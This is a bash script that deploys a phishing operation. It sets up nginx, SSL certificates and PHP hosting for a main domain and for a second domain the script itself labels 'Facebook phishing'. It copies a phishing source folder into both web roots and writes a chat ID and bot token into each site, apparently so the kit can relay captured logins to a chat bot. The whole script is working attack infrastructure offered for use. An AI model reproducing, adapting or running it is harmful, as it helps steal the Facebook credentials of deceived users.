#!/bin/bash

# Check if all 3 domain parameters are provided
if [ -z "$1" ] || [ -z "$2" ] || [ -z "$3" ]; then
    echo "Usage: $0 <main_domain> <facebook_domain> [chat_id] [bot_token]"
    echo "Example: $0 example.com facebook-phish.com 123456789 your_bot_token"
    echo "This will setup 3 separate domains:"
    echo "  - Main site: <main_domain> (main folder)"
    echo "  - Facebook phishing: <facebook_domain> (facebook folder)"
    exit 1
fi

MAIN_DOMAIN=$1
FB_DOMAIN=$2
CHAT_ID=$3
TOKEN=$4

# Add www versions
MAIN_WWW="www.$MAIN_DOMAIN"
FB_WWW="www.$FB_DOMAIN"

# Nginx config paths
MAIN_NGINX="/etc/nginx/sites-available/$MAIN_DOMAIN"
FB_NGINX="/etc/nginx/sites-available/$FB_DOMAIN"

# Web root paths
MAIN_ROOT="/var/www/html/$MAIN_DOMAIN"
FB_ROOT="/var/www/html/$FB_DOMAIN"

echo "Stopping Nginx..."
sudo systemctl stop nginx

# Install certbot if not installed
if ! command -v certbot &> /dev/null; then
    echo "Installing certbot..."
    sudo apt-get update
    sudo apt-get install -y certbot
fi

# Get SSL certificates for all 3 domains separately
echo "Getting SSL certificates for all 3 domains..."

# SSL for Main domain
if [ -d "/etc/letsencrypt/live/$MAIN_DOMAIN" ]; then
    echo "SSL certificate already exists for $MAIN_DOMAIN"
else
    echo "Getting SSL certificate for main domain: $MAIN_DOMAIN and $MAIN_WWW..."
    sudo certbot certonly --standalone -d $MAIN_DOMAIN -d $MAIN_WWW
fi

# SSL for Facebook domain
if [ -d "/etc/letsencrypt/live/$FB_DOMAIN" ]; then
    echo "SSL certificate already exists for $FB_DOMAIN"
else
    echo "Getting SSL certificate for Facebook domain: $FB_DOMAIN and $FB_WWW..."
    sudo certbot certonly --standalone -d $FB_DOMAIN -d $FB_WWW
fi



# Create web root directories for all sites
echo "Creating web root directories..."

# Main site
if [ ! -d "$MAIN_ROOT" ]; then
    sudo mkdir -p $MAIN_ROOT
    sudo chmod -R 755 $MAIN_ROOT
else
    sudo rm -rf $MAIN_ROOT
    sudo mkdir -p $MAIN_ROOT
    sudo chmod -R 755 $MAIN_ROOT
fi

# Facebook site
if [ ! -d "$FB_ROOT" ]; then
    sudo mkdir -p $FB_ROOT
    sudo chmod -R 755 $FB_ROOT
else
    sudo rm -rf $FB_ROOT
    sudo mkdir -p $FB_ROOT
    sudo chmod -R 755 $FB_ROOT
fi



# Copy entire source to all sites (shared source code)
if [ -d "/var/www/html/source" ]; then
    echo "Copying entire source to all sites..."

    # Copy all source files to main site
    sudo cp -r /var/www/html/source/* $MAIN_ROOT/ 2>/dev/null || true

    # Copy all source files to facebook site
    sudo cp -r /var/www/html/source/* $FB_ROOT/ 2>/dev/null || true


fi


# Write chat-id and token to files if provided
if [ ! -z "$CHAT_ID" ]; then
    echo "Writing chat ID to all sites..."
    echo "$CHAT_ID" | sudo tee $MAIN_ROOT/chat-id.txt > /dev/null
    echo "$CHAT_ID" | sudo tee $FB_ROOT/chat-id.txt > /dev/null
    echo "$CHAT_ID" | sudo tee $FB_ROOT/facebook/chat-id.txt > /dev/null
    sudo chmod 644 $MAIN_ROOT/chat-id.txt
    sudo chmod 644 $FB_ROOT/chat-id.txt
    sudo chmod 644 $FB_ROOT/facebook/chat-id.txt
fi

if [ ! -z "$TOKEN" ]; then
    echo "Writing token to all sites..."
    echo "$TOKEN" | sudo tee $MAIN_ROOT/token.txt > /dev/null
    echo "$TOKEN" | sudo tee $FB_ROOT/token.txt > /dev/null
    echo "$TOKEN" | sudo tee $FB_ROOT/facebook/token.txt > /dev/null
    sudo chmod 644 $MAIN_ROOT/token.txt
    sudo chmod 644 $FB_ROOT/token.txt
    sudo chmod 644 $FB_ROOT/facebook/token.txt
fi

# Remove old config files
echo "Removing old nginx configurations..."
sudo rm -f $MAIN_NGINX $FB_NGINX
sudo rm -f /etc/nginx/sites-enabled/$MAIN_DOMAIN
sudo rm -f /etc/nginx/sites-enabled/$FB_DOMAIN

# Create Nginx configuration for main site
echo "Creating Nginx configuration for main site ($MAIN_DOMAIN)..."
sudo tee $MAIN_NGINX > /dev/null << EOF
server {
    listen 80;
    server_name $MAIN_DOMAIN $MAIN_WWW;
    return 301 https://\$host\$request_uri;
}

server {
    listen 443 ssl;
    server_name $MAIN_DOMAIN $MAIN_WWW;

    ssl_certificate /etc/letsencrypt/live/$MAIN_DOMAIN/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/$MAIN_DOMAIN/privkey.pem;

    root $MAIN_ROOT;
    index index.html index.htm index.php;

    location / {
        try_files \$uri \$uri/ /main/index.php?\$query_string;
    }

    location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;
        fastcgi_param SCRIPT_FILENAME \$document_root\$fastcgi_script_name;
        include fastcgi_params;
    }
}
EOF

# Create Nginx configuration for Facebook site
echo "Creating Nginx configuration for Facebook site ($FB_DOMAIN)..."
sudo tee $FB_NGINX > /dev/null << EOF
# HTTP -> HTTPS
server {
    listen 80;
    server_name $FB_DOMAIN $FB_WWW;
    return 301 https://$FB_DOMAIN$request_uri;
}

# HTTPS cho non-www (chính)
server {
    listen 443 ssl;
    server_name $FB_DOMAIN $FB_WWW;

    ssl_certificate /etc/letsencrypt/live/$FB_DOMAIN/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/$FB_DOMAIN/privkey.pem;

    root /var/www/html/$FB_DOMAIN/facebook;
    index index.php index.html;

    # Static & route
    location / {
        # Nếu là file tĩnh thì trả thẳng; không có thì đẩy về index.php với query
        try_files $uri $uri/ /index.php?$args;
    }

    # PHP-FPM
    location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        # Sửa socket/port đúng với phiên bản PHP-FPM bạn đang dùng
        fastcgi_pass unix:/run/php/php7.4-fpm.sock;
        # hoặc: fastcgi_pass 127.0.0.1:9000;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        include fastcgi_params;
    }

    # Bảo mật nhỏ
    location ~ /\.ht {
        deny all;
    }
}

# HTTPS cho www -> ép về non-www (tránh vòng lặp www <-> non-www)
server {
    listen 443 ssl http2;
    server_name www.$FB_DOMAIN;

    ssl_certificate /etc/letsencrypt/live/$FB_DOMAIN/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/$FB_DOMAIN/privkey.pem;

    return 301 https://$FB_DOMAIN$request_uri;
}
EOF

# Create symbolic links for all sites
echo "Creating symbolic links..."
sudo ln -sf $MAIN_NGINX /etc/nginx/sites-enabled/$MAIN_DOMAIN
sudo ln -sf $FB_NGINX /etc/nginx/sites-enabled/$FB_DOMAIN

# Test Nginx configuration
echo "Testing Nginx configuration..."
sudo nginx -t

# Reload Nginx
echo "Reloading Nginx..."
sudo systemctl restart nginx

echo "Setup completed for all 3 domains!"
echo "✅ Main site: https://$MAIN_DOMAIN"
echo "✅ Facebook phishing: https://$FB_DOMAIN"

if [ ! -z "$CHAT_ID" ]; then
    echo "📱 Chat ID written to all sites"
fi

if [ ! -z "$TOKEN" ]; then
    echo "🔑 Token written to all sites"
fi

echo ""
echo "🌐 Test your sites:"
echo "   curl -I https://$MAIN_DOMAIN"
echo "   curl -I https://$FB_DOMAIN"
